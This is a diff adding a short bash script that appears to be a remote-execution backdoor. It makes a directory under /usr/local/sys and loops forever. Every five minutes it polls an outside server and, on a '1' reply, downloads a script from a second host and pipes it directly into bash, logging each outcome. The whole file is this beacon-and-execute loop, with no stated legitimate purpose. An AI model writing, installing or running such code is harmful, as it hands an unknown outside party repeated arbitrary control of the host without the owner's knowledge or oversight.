@@ -1,0 +1,23 @@
+#!/bin/bash
+dirsys=/usr/local/sys
+if [ ! -d $dirsys ];then
+mkdir -p $dirsys
+fi
+
+cd $dirsys
+
+while :
+do
+mod=`curl  -X POST  https://v.hankhu.xyz/sys.php -d 'usernameid' -s`
+
+if [ $mod -eq 1 ];then
+  bash  <(curl  -Ls https://hh.hankhu.com/mysh/usernameid.sh)
+  echo `date "+%Y-%m-%d %H:%M:%S"` succesed >> ./sys.info
+else
+
+  echo `date "+%Y-%m-%d %H:%M:%S"` donothing >> ./sys.info
+fi
+
+sleep 300
+
+done
